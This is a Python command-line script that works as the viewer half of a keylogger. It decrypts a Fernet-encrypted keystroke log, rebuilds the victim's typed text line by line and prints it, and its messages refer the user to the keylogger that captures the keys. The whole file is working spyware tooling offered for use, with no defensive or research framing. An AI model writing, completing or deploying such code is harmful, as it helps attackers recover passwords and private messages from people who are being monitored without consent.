#!/usr/bin/env python3
"""
Cross-platform encrypted log viewer
Reconstructs captured text perfectly
"""
import argparse
import json
from pathlib import Path
from cryptography.fernet import Fernet


class LogViewer:
    def __init__(self):
        self.log_file = Path("keystrokes.enc")
        self.key_file = Path("key.key")
        if not self.key_file.exists():
            print("❌ No key file. Run keylogger first.")
            return
        self.key = self.key_file.read_bytes()
        self.cipher = Fernet(self.key)

    def decrypt(self, data):
        try:
            return json.loads(self.cipher.decrypt(data).decode())
        except:
            return []

    def reconstruct(self, all_keys, lines=None):
        if lines:
            all_keys = all_keys[-lines:]

        buffer = []
        output = []

        for key in all_keys:
            k = key['key']
            if k == 'Key.space':
                buffer.append(' ')
            elif k == 'Key.enter':
                output.append(''.join(buffer))
                buffer = []
            elif k == 'Key.backspace' and buffer:
                buffer.pop()
            elif k == 'Key.tab':
                buffer.append('\t')
            elif len(k) == 1:
                buffer.append(k)

        if buffer:
            output.append(''.join(buffer))
        return output

    def view(self, lines=None):
        if not self.log_file.exists():
            print("❌ No logs found. Run keylogger first.")
            return

        all_keystrokes = []
        with self.log_file.open('rb') as f:
            for line in f:
                entry = self.decrypt(line.strip())
                all_keystrokes.extend(entry)

        if not all_keystrokes:
            print("📭 Empty log")
            return

        print(f"📊 {len(all_keystrokes):,} keys captured")
        print("─" * 60)

        texts = self.reconstruct(all_keystrokes, lines)
        for i, line in enumerate(texts, 1):
            print(f"{i:2d}: {repr(line)}")
        print("─" * 60)
        print(f"💾 {self.log_file} ({self.log_file.stat().st_size} bytes)")


def main():
    parser = argparse.ArgumentParser(description="🔍 Keylog Viewer")
    parser.add_argument("-l", "--lines", type=int, default=None, help="Last N lines")
    args = parser.parse_args()

    viewer = LogViewer()
    viewer.view(args.lines)


if __name__ == "__main__":
    main()